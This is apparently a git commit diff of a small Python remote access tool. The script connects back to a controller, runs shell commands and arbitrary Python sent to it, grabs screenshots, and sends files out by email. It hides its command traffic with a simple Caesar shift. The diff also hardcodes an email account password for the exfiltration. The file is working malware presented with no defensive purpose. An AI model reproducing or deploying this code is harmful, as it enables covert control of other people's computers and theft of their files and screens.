85375dc2de6599f6a984c69967ad0dad9557882f
孤独的帅哥杨 <87306964+ycy20090311@users.noreply.github.com>
2022-06-29 19:08:13 +0800

    Update b1.py
    2022 6 29

--- b1.py
+++ b1.py
@@ -1,26 +1,34 @@
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import socket,subprocess,smtplib
+from tkinter import Tk
+from PIL import ImageGrab
+import socket,os,sys,subprocess,smtplib
+
+code0 = "+4"
+code1 = "-4"
+host = "smtp.163.com"
+port = "25"
+name = "ycy20090311@163.com"
+password = "NAFDQCPVXAVOISWR"
 
 def Caesar(i,string1):#凯撒密码加密与解密
     string2 = ""
     if i == 0:#加密
         for a in string1:
-            string2 = string2 + chr(ord(a)+4)
+            string2 = string2 + chr(eval("ord(a)"+code0))
     elif i == 1:#解密
         for a in string1:
-            string2 = string2 + chr(ord(a)-4)
+            string2 = string2 + chr(eval("ord(a)"+code1))
     return string2
 def Shell(cmd):#执行shell
     shell = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-    out = shell.stdout.read()
-    err = shell.stderr.read()
-    out = out.decode()
-    err = err.decode()
+    out = shell.stdout.read().decode()
+    err = shell.stderr.read().decode()
     if out == "" and err == "":#避免向套间字发送""造成套间字中断
         out = " "
     return out+err
-def Email(host,port,name,passwd,file1):
+def Get(file1):#获取文件
     msg = MIMEMultipart()
     file = MIMEText(open(file1,"rb").read(),"base64","utf-8")
     file["Content-Type"] = "application/octet-stream"
@@ -28,20 +36,32 @@ def Email(host,port,name,passwd,file1):
     msg.attach(file)
     smtp = smtplib.SMTP()
     smtp.connect(host,port)
-    smtp.login(name,passwd)
+    smtp.login(name,password)
     smtp.sendmail(name,name,msg.as_string())
     smtp.close()
+    return name+" "+file1
+def Win():#获取屏幕截图
+    windown = Tk()
+    jpg = ImageGrab.grab((0,0,int(windown.winfo_screenwidth()),int(windown.winfo_screenheight())))
+    jpg.save("./.win.jpg")
+    Get("./.win.jpg")
+    os.remove("./.win.jpg")
     return "OK"
+def Py(cmd):
+    exec(cmd)
+    return "OK"
+
 if '__main__' == __name__:
     t = socket.socket()
-    t.connect((sys.argv[1],int(sys.argv[2]))
+    t.connect((sys.argv[1],int(sys.argv[2])))
     while True:
         cmd = Caesar(1,t.recv(2048).decode()).split(" ",1)
         if cmd[0] == "shell":
             t.send(Caesar(0,Shell(cmd[1])).encode())
-        elif cmd[0] == "email":
-            cmd = cmd[1].split()
-            t.send(Caesar(0,Email(cmd[0],cmd[1],cmd[2],cmd[3],cmd[4])).encode())
-        else:
-            t.send("SB".encode())
+        elif cmd[0] == "get":
+            t.send(Caesar(0,Get(cmd[1])).encode())
+        elif cmd[0] == "win":
+            t.send(Caesar(0,Win()).encode())
+        elif cmd[0] == "py":
+            t.send(Caesar(0,Py(cmd[1])).encode())
     t.close()
